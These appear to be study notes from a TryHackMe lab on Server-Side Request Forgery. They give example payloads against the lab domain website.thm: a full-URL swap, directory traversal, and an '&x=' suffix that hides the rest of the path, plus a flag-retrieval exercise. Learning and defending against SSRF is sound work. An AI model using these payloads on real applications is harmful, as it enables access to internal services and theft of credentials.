
Server-Side Request Forgery (SSRF) occurs when an ***application requests a remote resource using a user-supplied URL.***

**Types of SSRF:**
- **Regular SSRF:** where data is returned to the attacker's screen.
- **Blind SSRF:** SSRF occurs, but no information is returned to the attacker's screen. 

**Example**
1. The attacker can have complete ***control over the page*** requested by the webserver.
	- **Expected Request
		- hxxp://website.thm/stock?url=<span class="color-red">hxxp://api.website.thm/api/stock/item?id=123</span>
		Note: `The attacker can modify the area in red to an URL of their choice`
	- **Hacker Request**
		- hxxp://website.thm/stock?url=hxxp://api.website.thm/api<span class="color-red">/user</span>
	- **Website Request**
		- hxxp://api.website.thm/api<span class="color-red">/user</span>

2. An attacker can still reach the `/api/user` page with only having ***control over the path*** by utilising ***directory traversal.***
	- **Expected Request**
		- hxxp://website.thm/stock?url=<span class="color-red">item?id=123</span>
	- **Hacker Requests**
		- hxxp://website.thm/stock?url=<span class="color-red">/../user</span>
	- **Website Request**
		- hxxp://api.website.thm/api/stock/<span class="color-red">../user</span>

3. The attacker ***controls the server's subdomain*** and uses a payload ending in `&x=` to prevent the remaining path from appending to their URL, converting it into a query parameter (`?x=`).
	- **Expected Request**
		- hxxp://website.thm/stock?server=<span class="color-red">api</span>&id=<span class="color-red">123</span>
		**Purpose**
			The server queries `api.website.thm` to fetch stock data.
	- **Hacker Requests**
		- hxxp://website.thm/stock?server=<span class="color-red">api.website.thm/api/user&x=</span>&id=<span class="color-red">123</span>
		**Attack Technique:**
		    The attacker injects **`api.website.thm/api/user`** into the `server` parameter.
			The `&x=` portion acts as a delimiter, turning the remaining path into a query parameter (`?x=`).
		    This manipulates the request flow, redirecting the request to a different endpoint controlled by the attacker.
	- **Website Request**
		- hxxp://<span class="color-red">api.website.thm/api/user?x=</span>.website.thm/api/stock/item?id=<span class="color-red">123</span>
		**Impact:**
			The server accesses `hxxp://api.website.thm/api/user` instead of the intended `stock` API.
			The original path `/stock/item` becomes part of the query string (`?x=`), which has no functional impact, allowing the attack to proceed unnoticed.

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by `website.thm` (that would normally authenticate to `api.website.thm`). 

#### TryHackMe Example
Try changing the address in the browser below to force the webserver to return data from **hxxps://server.website.thm/flag?id=9**. 

**Our URL without `&x=`:**
```
https://website.thm/item/2?server=server.website.thm/flag?id=9
```
**Server Requesting:**
```
https://server.website.thm/flag?id=9.website.thm/api/item?id=2
```


**Our URL with the inclusion of `&x=`:**
```
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
```
**Server Requesting:**
```
https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2
```